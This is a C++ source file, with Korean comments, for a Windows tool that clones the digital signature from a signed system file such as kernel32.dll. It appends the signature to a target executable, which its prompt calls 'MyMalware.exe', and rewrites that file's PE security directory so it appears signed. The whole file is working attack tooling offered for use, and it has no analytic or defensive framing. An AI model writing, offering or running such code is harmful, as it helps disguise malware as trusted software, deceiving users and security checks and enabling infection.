// SKN_Signiture.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
//

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>

// C++17 이상 버전을 확인하여 filesystem 헤더를 포함합니다.
#if __cplusplus >= 201703L || (defined(_MSVC_LANG) && _MSVC_LANG >= 201703L)
#include <filesystem>
namespace fs = std::filesystem;
#else
#include <experimental/filesystem>
namespace fs = std::experimental::filesystem;
#endif

#include <winnt.h>

// 파일의 PE 아키텍처를 확인하고 서명 정보를 가져오는 함수
bool GetSignatureInfo(const fs::path& filePath, IMAGE_DATA_DIRECTORY& securityDir) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Error: Cannot open file " << filePath << " to read. Error code: " << GetLastError() << std::endl;
        return false;
    }

    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap == NULL) {
        CloseHandle(hFile);
        return false;
    }

    LPVOID lpBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (lpBase == NULL) {
        CloseHandle(hMap);
        CloseHandle(hFile);
        return false;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        // ... Clean up and return false
        return false;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        // ... Clean up and return false
        return false;
    }

    // *** 핵심 수정: 32비트/64비트 OptionalHeader 구분 ***
    if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        PIMAGE_NT_HEADERS32 pNtHeaders32 = (PIMAGE_NT_HEADERS32)pNtHeaders;
        securityDir = pNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    }
    else if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)pNtHeaders;
        securityDir = pNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    }
    else {
        // Not a recognized PE file
        UnmapViewOfFile(lpBase);
        CloseHandle(hMap);
        CloseHandle(hFile);
        return false;
    }

    UnmapViewOfFile(lpBase);
    CloseHandle(hMap);
    CloseHandle(hFile);

    return securityDir.Size > 0;
}

int main()
{
    std::string signedFilePathStr, targetFilePathStr;

    std::cout << "Enter the path of the signed file (e.g., C:\\Windows\\System32\\kernel32.dll): ";
    std::getline(std::cin, signedFilePathStr);

    std::cout << "Enter the path of the target file to inject the signature into (e.g., MyMalware.exe): ";
    std::getline(std::cin, targetFilePathStr);

    fs::path signedFilePath = signedFilePathStr;
    fs::path targetFilePath = targetFilePathStr;

    if (!fs::exists(signedFilePath) || !fs::exists(targetFilePath)) {
        std::cerr << "[-] Error: One of the specified files does not exist." << std::endl;
        system("pause");
        return 1;
    }

    std::cout << "\n[+] Starting Signature Transfer Process...\n";

    IMAGE_DATA_DIRECTORY securityDir;
    if (!GetSignatureInfo(signedFilePath, securityDir)) {
        std::cerr << "[-] Error: The source file '" << signedFilePath.filename() << "' does not have a digital signature or is not a valid PE file." << std::endl;
        system("pause");
        return 1;
    }

    std::cout << "[+] Signature found in '" << signedFilePath.filename() << "' at offset "
        << securityDir.VirtualAddress << " with size " << securityDir.Size << " bytes." << std::endl;

    std::ifstream signedFile(signedFilePath, std::ios::binary);
    signedFile.seekg(securityDir.VirtualAddress, std::ios::beg);
    std::vector<char> signatureData(securityDir.Size);
    signedFile.read(signatureData.data(), securityDir.Size);
    signedFile.close();

    std::cout << "[+] Successfully extracted signature data." << std::endl;

    long long originalTargetSize = static_cast<long long>(fs::file_size(targetFilePath));

    std::ofstream targetFile(targetFilePath, std::ios::binary | std::ios::app);
    targetFile.write(signatureData.data(), signatureData.size());
    targetFile.close();

    std::cout << "[+] Appended signature to '" << targetFilePath.filename() << "'." << std::endl;

    HANDLE hTargetFile = CreateFileW(targetFilePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hMapFile = CreateFileMapping(hTargetFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    LPVOID lpBase = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)lpBase + pDosHeader->e_lfanew);

    // *** 대상 파일의 헤더도 32/64비트 구분하여 업데이트 ***
    if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        PIMAGE_NT_HEADERS32 pNtHeaders32 = (PIMAGE_NT_HEADERS32)pNtHeaders;
        pNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = static_cast<DWORD>(originalTargetSize);
        pNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = securityDir.Size;
    }
    else if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)pNtHeaders;
        pNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = static_cast<DWORD>(originalTargetSize);
        pNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = securityDir.Size;
    }

    std::cout << "[+] Updating PE header of target file..." << std::endl;
    std::cout << "    New signature offset: " << originalTargetSize << std::endl;
    std::cout << "    New signature size: " << securityDir.Size << std::endl;

    UnmapViewOfFile(lpBase);
    CloseHandle(hMapFile);
    CloseHandle(hTargetFile);

    std::cout << "\n[SUCCESS] Operation completed!" << std::endl;
    std::cout << "Check the properties of '" << targetFilePath.filename() << "' to see the cloned signature." << std::endl;

    system("pause");
    return 0;
}